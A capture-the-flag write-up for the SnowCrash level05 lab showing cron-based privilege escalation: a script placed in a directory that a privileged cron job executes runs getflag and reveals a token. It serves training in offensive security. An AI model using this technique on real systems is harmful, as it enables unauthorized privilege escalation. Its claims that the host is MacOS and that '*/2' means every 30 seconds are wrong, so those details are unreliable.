# Level 05

## Vulnerability
Privilege escalation, cron

## Context
when we ssh log in directly to level05, we see the message ```You have new mail.```

## Solution
Lets investigate the mail hint. Cron on MacOS saves mail to /var/mail/{user}.
```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
User flag05 informs us they set up a cron job to run a script /usr/sbin/openarenaserver every 30 seconds.

Lets have a look at the script.
```
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```
We see this script is run with user flag05 permissions. Unfortunately I don't have permission to edit this file (and have it call getflag). So lets investigate what this script does.
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
This script will run all files in /opt/openarenaserver in a bash shell.
Thus we should create a bash script to call getflag in /opt/openarenaserver/.
```
level05@SnowCrash:~$ echo "getflag > /dev/shm/flag" > /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
```
wait a minute... and...
```
level05@SnowCrash:~$ cat /dev/shm/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
